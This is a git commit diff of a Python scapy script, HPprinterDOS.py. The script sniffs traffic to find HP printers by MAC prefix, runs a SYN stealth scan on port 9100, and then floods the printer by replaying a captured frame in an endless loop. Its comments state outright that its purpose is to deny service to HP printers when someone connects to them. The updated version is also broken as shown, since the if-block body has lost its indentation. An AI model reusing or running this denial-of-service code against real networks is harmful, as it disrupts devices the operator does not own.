b5c42dd955438133c43bf4c6f88ef6d0b78e80dc
asher-epstein-42 <110289469+asher-epstein-42@users.noreply.github.com>
2022-08-06 02:12:09 +0300

    Update HPprinterDOS.py

--- HPprinterDOS.py
+++ HPprinterDOS.py
@@ -9,27 +9,26 @@ def filter_HP_device(frame):
 	return frame[Ether].dst[0:8] == "9c:7b:ef" #Hewlett Packard(HP) mac address
  
 
-while True:	
+
 #sniffing a HP device by mac address	
-	frames = sniff(count = 1, lfilter = filter_HP_device)
+frames = sniff(count = 1, lfilter = filter_HP_device)
 
-	printer_possible_ip = frames[0][IP].dst 
-
+printer_possible_ip = frames[0][IP].dst  #The ip of the hp device 
+ 
 #stealth scan->hp printer ip and port 9100 
 
-	stealth_scan_hp = sr1(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='S'),timeout=10)
+stealth_scan_hp = sr1(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='S'),timeout=10)
 
-	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
-	#send reset to complete the scan
-		send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='R'),timeout=10)
-	#start dos attack
-		for i in range(1000):		
-			sendp(frames[0])
-	#after the dos attack, we continue trying to sniff if anyone is connecting to a hp printer(going back to the while loop)
+if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 Flag -> syn ack -> the port is open
+#send reset to complete the scan
+send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='R'),timeout=10)
+#start dos attack	
+sendp(frames[0],loop = 1)
+#after the dos attack, we continue trying to sniff if anyone is connecting to a hp printer
 	
 	
 	
-
+	
 #The porpose of this script is to check if someone is trying to connect to a HP printer over the network,
 #and in case of detection -> perform a dos(denial of service) attack on the hp printer
 # first, we are sniffing using scapy to check if someone is trying to connect to a hp device.
